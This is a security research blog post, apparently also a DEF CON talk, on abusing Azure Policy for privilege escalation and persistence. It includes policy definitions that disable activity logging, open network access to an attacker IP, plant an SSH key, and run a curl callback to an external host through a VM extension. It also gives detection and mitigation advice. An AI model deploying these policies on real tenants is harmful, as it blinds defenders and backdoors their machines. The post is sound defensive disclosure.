@@ -1,0 +1,210 @@
+
+Note: This content was also presented at the DEF CON 32 Cloud Village. You can find the slides here.
+Introduction
+The Azure Policy is one of hundreds of services within the Microsoft Azure universe, but it holds a special place of importance. This service is a major source of compliance rules. It’s also a repository of best practices and guidance from Microsoft for how to configure your cloud services securely, including policies for many of Azure’s baseline security recommendations, to help users audit for compliance. The Policy service can even aid in remediation at scale.
+All this may make Azure Policy sound unassuming, but the service has been quietly hiding a secret identity. By day, Azure Policy helps enforce standards and maintain a compliant environment—but by night (or whenever an attacker gets their hands on it), Azure Policy can transform into a powerful tool capable of deploying and modifying nearly any Azure resource imaginable, with nearly unlimited abuse potential.
+
+In this post, we'll unmask these hidden capabilities of Azure Policy. We'll delve into the potential dark side of this service and examine how attackers could exploit it for their own nefarious purposes, such as privilege escalation and persistence.
+I should mention at the outset that this sort of abuse is not a completely original discovery. Microsoft notes it in their Azure Threat Matrix. But beyond a simple mention, there is almost no detail of what actually goes into this sort of abuse. My aim is to paint a full picture of this service and how it can be abused, so that defenders have a better sense of why this matters. I also include details and abuse scenarios that appear novel from what has previously been documented.
+Understanding Azure Policy
+Effectively, the Azure Policy service is a cloud posture management tool built into Azure itself. It allows you to enable rules out of the box and write custom rules of your own to audit resources within your environment. Because it is deeply integrated with Azure itself, Azure Policy can audit and block creation of non-compliant resources during their actual deployment.
+
+Some examples of things you can do with Azure Policy include:
+
+Ensuring your team deploys Azure resources only to allowed regions
+Enforcing the consistent application of specific tags
+Requiring resources to send diagnostic logs to a Log Analytics workspace
+Azure policies are implemented as “definitions,” which look like so:
+properties:
+ type: Microsoft.Authorization/policyDefinitions
+ displayName: <DISPLAY NAME>
+ description: <DESCRIPTION>
+ policyRule:
+   if: <CONDITION>
+   then:
+     effect: <DO SOMETHING>
+The logic of the definitions lives in the policyRule block. This logic dictates the conditions that are evaluated against the resource (if) and what happens (then) when the first section evaluates to true. The effect parameter alters what actually happens when the rules fires and can be any number of a list of effects, such as audit, append, and deployIfNotExists.
+
+As a simple example, here is a policy definition that blocks the creation of any resource that lacks a Department tag:
+properties:
+ type: Microsoft.Authorization/policyDefinitions
+ displayName: Ensure tag 'Department' exists on resources
+ description: This policy ensures that all resources in the subscription have a 'Department' tag.
+ policyRule:
+   if:
+     field: Department exists: "false"
+   then:
+     effect: deny
+In order for a policy definition to actually be active, it must be assigned. Assigning a policy binds it to a particular scope of evaluation (e.g., management group, resource group, etc.), which controls where it is active, and allows the user to provide values for parameters and resource selectors—for example, to customize the configuration of the policy as it is applied.
+So far, so good. Where the story gets more interesting is in policies that are set up to perform remediation. Policy effects can both modify resources during their creation or update (modify, append) or actually trigger the creation of entirely new, separate resources (deployIfNotExists) as a side effect of a resource change or creation.
+As an example, Azure has the built-in policy “Configure system-assigned managed identity to enable Azure Monitor assignments on VMs”. This policy can be used to audit compliance and flags the non-compliant resources in the Azure Policy UI. But if the policy is set to effect: modify, it alters the configuration of the VMs transparently as they are deployed by adding a managed identity to them.
+In order to actually perform such modifications and resource creations, policy assignments themselves have service principals assigned to them—these have roles assigned (e.g., contributor, owner, virtual machine administrator, etc.) that house the permissions of the policy. Policy definitions specify the roles they require, and if a user has the required privileges to assign roles, this process will be carried out for them during policy assignments (at least when done through the UI).
+The final object we care about is the policyInitiative or policySetDefinition. This is a grouping of policies and roles designed to accomplish a specific goal, such as regulatory compliance. For this object, too, a policy set needs to be assigned in order for it to be active, and permissions are given to this assignment via a service principal with a role.
+It should be noted that the effect append does not require a service principal to cause changes to resources. It's not able to deploy other resources like deployIfNotExists, but it can fully alter a resource as it’s deploying.
+What could possibly go wrong?
+Now that we’re familiar with the basic, high-level operations of Azure Policy, let's start thinking about how an attacker might abuse this service.
+It’s important to recognize that essentially any action that creates or configures resources can be performed through the Policy service. There are minor limitations, but it is essentially a full-fledged cloud orchestration framework disguised as a compliance tool. And it is reactive, in the way that AWS Lambdas can react to events, so the actions of the service happen automatically once configured.
+Azure Policy reacts to resource creation and updates, ensuring future resources comply with policies. It can also be used retroactively, using what are called “remediations”—essentially triggered runs of the service that evaluate compliance and then perform their effects against existing resources.
+Putting on our black hat, we can start to imagine what an attack might do with this service. Let’s say there’s a policy “Configure Azure Activity logs to stream to specified Log Analytics workspace” that is intended to ensure that logging is always running. The reverse of this policy would be to turn off logging automatically for all VMs (or, if the attacker is clever and sneaky, they might scope their policy to a particular VM or set of VMs they want to access). Once the policy is created, the attack would create a remediation that would turn off logging on existing VMs. Going forward, new VMs deployed would have their logging turned off as well. (Note that all policies are shown as YML for readability, but they use JSON natively).
+properties:
+ type: Microsoft.Authorization/policyDefinitions
+ displayName: Turn off activity logs
+ policyRule:
+   if:
+     field: type
+     equals: Microsoft.Resources/subscriptions
+   then:
+     effect: 'DeployIfNotExists'
+     details:
+       type: Microsoft.Insights/diagnosticSettings
+       deploymentScope: Subscription
+       existenceScope: Subscription
+       existenceCondition:
+         allof:
+           - field: Microsoft.Insights/diagnosticSettings/logs.enabled
+             equals: true
+       deployment:
+         properties:
+           resources:
+             - name: subscriptionToTurnOffActivityLogs
+               type: Microsoft.Insights/diagnosticSettings
+               location: Global
+               properties:
+                 workspaceId: 'MyWorkspaceID'
+                 logs:
+                   - category: Administrative
+                     enabled: False
+                   - category: Security
+                     enabled: False
+ roleDefinitionIds:
+   - /providers/microsoft.authorization/roleDefinitions/749f88d5-cbae-40b8-bcfc-e573ddc772fa
+   - /providers/microsoft.authorization/roleDefinitions/92aaf0da-9dab-42b6-94a3-d43ce8d16293
+Now, let's say the attacker wants to actually access these machines to perform cryptomining. The environment is set up so that communications go over a private network, with a few IPs allow-listed for the VPN or for SREs to fix things (I know that you would never do this, but just play along 😄). It would be a simple matter for our attacker to append their IP to this allowlist.
+properties:
+ type: Microsoft.Authorization/policyDefinitions
+ displayName: Append NSG Rule
+ policyRule:
+   if:
+     allOf:
+       - field: type
+         equals: Microsoft.Network/networkSecurityGroups
+       - field: name
+         like: '*MyNSG'
+   then:
+     effect: Append
+     details:
+       - field: Microsoft.Network/networkSecurityGroups/securityRules[*]
+         value:
+           name: New NSG Rule
+           properties:
+             protocol: TCP
+             sourcePortRange: '*'
+             destinationPortRange: '*'
+             sourceAddressPrefix: 172.217.17.17
+             destinationAddressPrefix: '*'
+             access: Allow
+             priority: 1
+             direction: Inbound
+             sourcePortRanges: []
+             destinationPortRanges: []
+             sourceAddressPrefixes: []
+             destinationAddressPrefixes: []
+Luckily, defenders aren’t stupid, and they’re using SSH with public keys, which are included as part of the provisioning. So they should be fine, right? Unfortunately, our attacker can again create an append policy to add their SSH key to the VM.
+properties:
+ type: Microsoft.Authorization/policyDefinitions
+ displayName: zm-append-ssh
+ policyType: Custom
+ mode: Indexed
+ policyRule:
+   if:
+     allOf:
+       - field: type
+         equals: Microsoft.Compute/virtualMachines
+       - field: tags
+         containsKey: zander-test
+   then:
+     effect: append
+     details:
+       - field: Microsoft.Compute/virtualMachines/osProfile.linuxConfiguration.ssh.publicKeys[*]
+         value:
+           keyData: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ==etc
+           path: /home/zander.mackie/.ssh/authorized_keys
+What if the attacker wants to be even stealthier? What if they want a reverse shell on these VMs? Surely they couldn’t do that with a compliance service…
+properties:
+ type: Microsoft.Authorization/policyDefinitions
+ displayName: Backdoor VMs
+ policyRule:
+   if:
+     allOf:
+       - field: type
+         equals: Microsoft.Compute/virtualMachines
+       - field: Microsoft.Compute/virtualMachines/storageProfile.osDisk.osType
+         equals: Linux
+   then:
+     effect: DeployIfNotExists
+     details:
+       type: Microsoft.Compute/virtualMachines/extensions
+       deployment:
+         properties:
+           template:
+             resources:
+               - name: 'extension'
+                 type: Microsoft.Compute/virtualMachines/extensions
+                 properties:
+                   publisher: Microsoft.Azure.Extensions
+                   type: CustomScript
+                   settings:
+                     commandToExecute: 'curl -X POST -H "Content-Type: application/json" -d ''{"data": "POC"}'' 1234.oastify.com'
+I think it's now safe to say the point has been made: virtually anything to do with resource creation and modification can happen through the Azure Policy service.
+
+Before you ask, you cannot write a policy that prevents other policies from being deleted, so don’t bother. Who’s that evil anyway?
+Permissions, privileges, and escalation thereof
+As for who can actually create and assign the above policies, there is a specific job-function role called Resource Policy Contributor designed for least-privileged work within this service. Sounds anodyne enough that it should go unnoticed by a security audit, right? But make no mistake—this is a powerful role.
+In order to actually assign roles to the service principals in question, the user needs to have permissions for role assignment, which is a separate permission from actually creating or editing policy definitions and assigning them to scopes—Owners and Contributors obviously can do all of this. User Access Administrator and Security Admin also have the effective permissions that let them write policy definitions and assign them.
+It's worth reiterating that append effect policies don’t require a service principal at all, so some of the above malicious policies could easily be achieved with Resource Policy Contributor. Any property returned by the following Powershell call is usable in an append policy. And there are a lot of modifiable properties. Microsoft takes requests, so if there’s anything you want to append, try filing an issue!
+Get-AzPolicyAlias | Select-Object -ExpandProperty 'Aliases' | Where-Object { $_.DefaultMetadata.Attributes -eq 'Modifiable' }
+There is also a backdoor of sorts for users with this role, whereby they can potentially elevate their privileges in situations where there is an existing policy assignment that includes a service principal with a role attached. There are two methods to achieve the privilege escalation described above: modification of policy definitions and modification of policy initiatives.
+Remember when I noted that Resource Policy Contributors can edit policy definitions? Let's examine a situation where policy definition A has assignment X, which has service principal SP with the Contributor role.
+
+All it takes is for Bob, with Resource Policy Contributor, to edit definition A. Because assignments are not specific to versions of a policy definition or acting as having their own copies of the definitions, changes to A cause changes everywhere that definition is assigned. Thinking of assignment X as a pointer to A, we can change the underlying value of A without changing the pointer itself. The effect of this is to cause the assignment to perform entirely different actions, using the role it has access to—a role far more privileged than the one Bob currently has.
+A more wide-ranging version of this abuse exists for policy sets, which are collections of policy definitions. When a policy set is assigned a service principal, that service principal’s permissions apply to all policies in the set. This effectively means that the set is assigned the widest possible set of permissions that covers everything it needs to do.
+Because Bob can edit policy set definitions too, he can create any number of new policy definitions and then add them to the policy set definition. If that policy set is assigned, the assignment and service principal inherit all of these changes. Bob could create all of the malicious policies above and attach them to a seemingly benign policy set assignment, accomplishing every step of the above attack in one fell swoop.
+Both of the above scenarios are abusable by design. Microsoft maintains that Resource Policy Contributor is a privileged role, to be given out cautiously, and that creating policy assignments with privileges should always be done with least privilege in mind—i.e., the role definitions that policies contain should be the minimum to accomplish the tasks necessary. While this is sound advice, some of Microsoft’s own built-in policies are over-permissioned—for example, by containing Owner or Contributor roles (11 and 205 as of latest count). The open source community has called this out, but the problem remains widespread.
+The situation with custom policies is even more of a footgun, because it can be quite difficult to get the permissions correct for the resources a policy might create or modify. The only way to know for certain is to create, assign, and run the policy, then wait for it to succeed or fail. Microsoft could provide some form of permissions-checking that would prevent creation of policies that cannot actually work, which should be simple enough with their APIs and would make policy creation much easier. Because of this difficulty, I suspect that users who are creating custom remediation policies typically choose a role like Contributor and move on with their day.
+In addition, the append effects are already quite powerful, without even taking advantage of an existing assignment. With a slew of modifiable properties a Resource Policy Contributor user can already accomplish quite a lot.
+Mitigations and detections
+First off, let me reiterate that this role and associated actions are more powerful than they seem, so administrators should treat this role with caution. Furthermore, using policies with effects for remediation is a double-edged sword: They can help a lot, but they can also be abused. What's particularly sneaky about this abuse is that it happens behind the scenes when regular deployment activities occur. Unless you’re specifically looking for it, policies with effects don’t produce any special logging events—you might only see a Microsoft.Authorization/policies/deployIfNotExists/action event. Modify and append effects do not appear to be logged at all.
+If you decide to use remediation effect policies, remember to check for least privilege and create custom versions of built-in policies that are more tightly permissioned if need be. It's also worth monitoring logs for MICROSOFT.AUTHORIZATION/POLICYASSIGNMENTS/WRITE and Microsoft.Authorization/policySetDefinitions/write events if this is part of your compliance strategy, to catch creations and alterations.
+Conclusion
+As with all services that are widely scoped, abuse potential is the flipside of utility. Azure Policy is very useful and comes out of the box with tons of power for auditing and enforcing security baselines and compliance regimes. Our aim in this post is to shed some light on the abuse potential of this service, so that defenders can use it safely and with full awareness of its powers.
+Updates made to this entry
+policyRule
+if
+then
+effect
+audit
+append
+deployIfNotExists
+Department
+modify
+append
+deployIfNotExists
+effect: modify
+policyInitiative
+policySetDefinition
+append
+deployIfNotExists
+append
+Resource Policy Contributor
+Owners
+Contributors
+User Access Administrator
+Security Admin
+append
+append
+append
+Microsoft.Authorization/policies/deployIfNotExists/action
+Modify
+append
+MICROSOFT.AUTHORIZATION/POLICYASSIGNMENTS/WRITE
+Microsoft.Authorization/policySetDefinitions/write
